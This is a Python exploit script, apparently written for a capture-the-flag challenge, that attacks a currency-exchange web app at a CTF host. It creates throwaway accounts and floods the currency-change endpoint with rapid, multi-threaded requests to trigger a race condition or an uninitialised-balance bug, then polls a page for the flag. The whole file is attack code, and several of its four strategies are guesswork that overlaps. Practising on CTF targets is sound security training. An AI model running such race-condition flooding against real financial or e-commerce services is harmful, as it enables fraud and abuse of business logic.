import requests
import time
import threading

# Target URL
BASE_URL = "http://ctf.compfest.id:7303"

def register_user(username, password):
    """Register a new user"""
    session = requests.Session()
    
    data = {
        "username": username,
        "password": password,
        "confirm_password": password
    }
    
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"Register response: {response.status_code}")
    return session

def login_user(session, username, password):
    """Login user"""
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"Login response: {response.status_code}")
    return session

def change_currency(session, currency):
    """Change currency"""
    data = {
        "currency": currency
    }
    
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"Change currency to {currency}: {response.status_code}")
    return session

def check_rich(session):
    """Check if we're rich enough for flag"""
    response = session.get(f"{BASE_URL}/are-you-rich")
    print(f"Are you rich page: {response.status_code}")
    if response.status_code == 200:
        print(f"Rich check content: {response.text}")
        if "FLAG" in response.text:
            print("ðŸŽ‰ FLAG FOUND! ðŸŽ‰")
            return True
    return False

def exploit_race_condition():
    """Try to exploit race conditions with multiple threads"""
    username = f"race_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to create race conditions with multiple threads
    print("\n=== Creating race conditions with multiple threads ===")
    
    def change_currency_thread():
        for _ in range(50):
            change_currency(session, "KRW")
            change_currency(session, "AUD")
            time.sleep(0.01)
    
    # Start multiple threads to create race conditions
    threads = []
    for i in range(5):
        thread = threading.Thread(target=change_currency_thread)
        threads.append(thread)
        thread.start()
    
    # Wait for threads to complete
    for thread in threads:
        thread.join()
    
    # Check if we got the flag
    return check_rich(session)

def exploit_floating_point_overflow():
    """Try to exploit floating point overflow with very large numbers"""
    username = f"float_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to exploit floating point overflow
    print("\n=== Exploiting floating point overflow ===")
    
    # Convert between currencies with very different rates multiple times
    for i in range(100):
        session = change_currency(session, "GBP")  # 0.48 (small)
        session = change_currency(session, "KRW")  # 888.04 (large)
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.01)
    
    return False

def exploit_session_manipulation():
    """Try to manipulate session state to trigger the bug"""
    username = f"session_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to manipulate session to create inconsistency
    print("\n=== Manipulating session state ===")
    
    # Try multiple rapid requests to create race conditions
    for i in range(100):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.01)
    
    return False

def exploit_bug_condition():
    """Try to exploit the specific bug condition more aggressively"""
    username = f"bug_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # The bug: Try to trigger the condition where user_balances[u] doesn't exist
    # but user_currencies[u] also doesn't exist, causing the bug:
    # user_balances[u] = STONKS_GIFT * user_currencies[u]
    
    print("\n=== Exploiting the specific bug condition ===")
    
    # Try to create a situation where user_currencies[u] might be None or missing
    # by doing multiple rapid currency changes that might cause race conditions
    
    # Test 1: Very rapid currency changes
    print("\n--- Test 1: Very rapid currency changes ---")
    for i in range(200):
        session = change_currency(session, "JPY")
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.005)  # Very fast requests
    
    return False

if __name__ == "__main__":
    print("=== FINAL STONKS EXPLOIT V5 ===")
    print(f"Target URL: {BASE_URL}")
    
    # Try multiple exploit strategies
    exploits = [
        exploit_race_condition,
        exploit_floating_point_overflow,
        exploit_session_manipulation,
        exploit_bug_condition
    ]
    
    for i, exploit_func in enumerate(exploits, 1):
        print(f"\n=== Trying Exploit {i} ===")
        if exploit_func():
            print(f"ðŸŽ‰ Exploit {i} SUCCESSFUL! ðŸŽ‰")
            break
        time.sleep(1)
    
    print("\n=== Exploit completed ===") 